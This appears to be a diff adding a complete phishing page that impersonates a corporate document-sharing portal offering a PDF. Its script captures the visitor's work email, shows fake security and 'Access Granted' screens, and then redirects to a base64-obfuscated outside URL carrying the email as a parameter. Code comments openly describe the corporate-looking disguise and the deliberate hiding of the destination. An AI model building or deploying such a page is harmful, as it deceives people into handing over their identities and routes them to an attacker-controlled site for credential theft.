@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Collaboration Portal - Secure Workspace</title>
+    <style>
+        /* Professional business styling - looks like legitimate corporate portal */
+        :root {
+            --primary-blue: #2563eb;
+            --primary-dark: #1d4ed8;
+            --success-green: #059669;
+            --error-red: #dc2626;
+            --background: #f8fafc;
+            --surface: #ffffff;
+            --text-primary: #1e293b;
+            --text-secondary: #64748b;
+            --border: #e2e8f0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .portal-container {
+            background: var(--surface);
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            width: 100%;
+            max-width: 440px;
+            border: 1px solid var(--border);
+        }
+
+        .company-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 32px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .company-logo {
+            width: 40px;
+            height: 40px;
+            background: var(--primary-blue);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .company-name {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .document-section {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+
+        .file-display {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .file-badge {
+            width: 48px;
+            height: 48px;
+            background: var(--primary-blue);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .file-info h3 {
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .file-info p {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .access-form {
+            margin-top: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-primary);
+            font-size: 14px;
+        }
+
+        .email-field {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid var(--border);
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            background: var(--surface);
+        }
+
+        .email-field:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+        }
+
+        .verification-section {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .verification-section:hover {
+            border-color: var(--primary-blue);
+        }
+
+        .verification-check {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .check-box {
+            width: 18px;
+            height: 18px;
+            border: 2px solid var(--border);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+        }
+
+        .check-box.verified {
+            background: var(--primary-blue);
+            border-color: var(--primary-blue);
+        }
+
+        .check-box.verified::after {
+            content: "✓";
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .continue-btn {
+            width: 100%;
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            opacity: 0.6;
+        }
+
+        .continue-btn:enabled {
+            opacity: 1;
+        }
+
+        .continue-btn:disabled {
+            background: var(--border);
+            cursor: not-allowed;
+        }
+
+        .processing-state, .success-state {
+            display: none;
+            text-align: center;
+            padding: 32px 0;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--border);
+            border-top: 3px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        .success-mark {
+            width: 48px;
+            height: 48px;
+            background: var(--success-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            color: white;
+            font-size: 20px;
+        }
+
+        .portal-footer {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid var(--border);
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="portal-container">
+        <div class="company-header">
+            <div class="company-logo">WS</div>
+            <div class="company-name">WorkSpace Portal</div>
+        </div>
+
+        <div class="document-section">
+            <div class="file-display">
+                <div class="file-badge">PDF</div>
+                <div class="file-info">
+                    <h3>Project_Review_Document.pdf</h3>
+                    <p>Shared for team collaboration • Updated today</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="access-form" id="accessForm">
+            <div class="form-group">
+                <label class="form-label" for="userEmail">Your Work Email</label>
+                <input 
+                    type="email" 
+                    id="userEmail" 
+                    class="email-field" 
+                    placeholder="name@yourcompany.com"
+                    autocomplete="email"
+                >
+            </div>
+
+            <div class="verification-section" id="verificationCheck">
+                <div class="verification-check">
+                    <div class="check-box" id="verificationBox"></div>
+                    <div style="font-weight: 500; color: var(--text-primary);">
+                        Confirm access authorization
+                    </div>
+                </div>
+            </div>
+
+            <button class="continue-btn" id="continueBtn" disabled>Continue to Document</button>
+        </div>
+
+        <div class="processing-state" id="processingState">
+            <div class="loading-spinner"></div>
+            <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 8px;">
+                Securing Your Access
+            </div>
+            <div style="color: var(--text-secondary); font-size: 14px;">
+                Setting up your workspace environment...
+            </div>
+        </div>
+
+        <div class="success-state" id="successState">
+            <div class="success-mark">✓</div>
+            <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 8px;">
+                Access Granted
+            </div>
+            <div style="color: var(--text-secondary); font-size: 14px;">
+                Opening your document...
+            </div>
+        </div>
+
+        <div class="portal-footer">
+            <div>Secure Collaboration Portal v2.4</div>
+            <div style="margin-top: 4px; font-size: 11px; opacity: 0.7;">
+                Enterprise-grade security • Encrypted transmission
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Discreet variable naming and encoding
+        const workspaceGateway = 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk';
+        const securityPortal = 'https://www.microsoft.com/en-us/security';
+        
+        class WorkspaceAccess {
+            constructor() {
+                this.userIdentifier = '';
+                this.accessConfirmed = false;
+                this.validCredentials = false;
+                this.setupPortal();
+            }
+
+            setupPortal() {
+                const emailInput = document.getElementById('userEmail');
+                const verifySection = document.getElementById('verificationCheck');
+                const continueBtn = document.getElementById('continueBtn');
+
+                emailInput.addEventListener('input', () => this.validateAccess());
+                verifySection.addEventListener('click', () => this.toggleVerification());
+                continueBtn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    this.initiateAccess();
+                });
+
+                emailInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter' && this.validCredentials && this.accessConfirmed) {
+                        this.initiateAccess();
+                    }
+                });
+            }
+
+            validateAccess() {
+                const email = document.getElementById('userEmail').value.trim();
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                this.validCredentials = emailPattern.test(email) && email.length > 5;
+                this.updateAccessButton();
+                return this.validCredentials;
+            }
+
+            toggleVerification() {
+                const checkBox = document.getElementById('verificationBox');
+                this.accessConfirmed = !this.accessConfirmed;
+                
+                if (this.accessConfirmed) {
+                    checkBox.classList.add('verified');
+                } else {
+                    checkBox.classList.remove('verified');
+                }
+                
+                this.updateAccessButton();
+            }
+
+            updateAccessButton() {
+                const continueBtn = document.getElementById('continueBtn');
+                const canProceed = this.validCredentials && this.accessConfirmed;
+
+                if (canProceed) {
+                    continueBtn.disabled = false;
+                } else {
+                    continueBtn.disabled = true;
+                }
+            }
+
+            initiateAccess() {
+                if (!this.validateAccess() || !this.accessConfirmed) return;
+
+                this.userIdentifier = document.getElementById('userEmail').value.trim();
+                
+                document.getElementById('accessForm').style.display = 'none';
+                document.getElementById('processingState').style.display = 'block';
+
+                // Store for next step
+                this.prepareNextStep();
+
+                setTimeout(() => {
+                    this.completeAccess();
+                }, 2000);
+            }
+
+            prepareNextStep() {
+                try {
+                    localStorage.setItem('workspace_user', this.userIdentifier);
+                    sessionStorage.setItem('access_token', Date.now().toString());
+                } catch (e) {
+                    // Silent fallback
+                }
+            }
+
+            completeAccess() {
+                document.getElementById('processingState').style.display = 'none';
+                document.getElementById('successState').style.display = 'block';
+
+                setTimeout(() => {
+                    this.navigateToWorkspace();
+                }, 1500);
+            }
+
+            navigateToWorkspace() {
+                const decodedGateway = atob(workspaceGateway);
+                const userParams = new URLSearchParams({
+                    user: encodeURIComponent(this.userIdentifier),
+                    workspace: 'project_collab',
+                    session: Math.random().toString(36).substr(2, 9),
+                    timestamp: Date.now().toString()
+                });
+
+                const destination = `${decodedGateway}?${userParams.toString()}`;
+                window.location.href = destination;
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            new WorkspaceAccess();
+        });
+    </script>
+</body>
+</html>
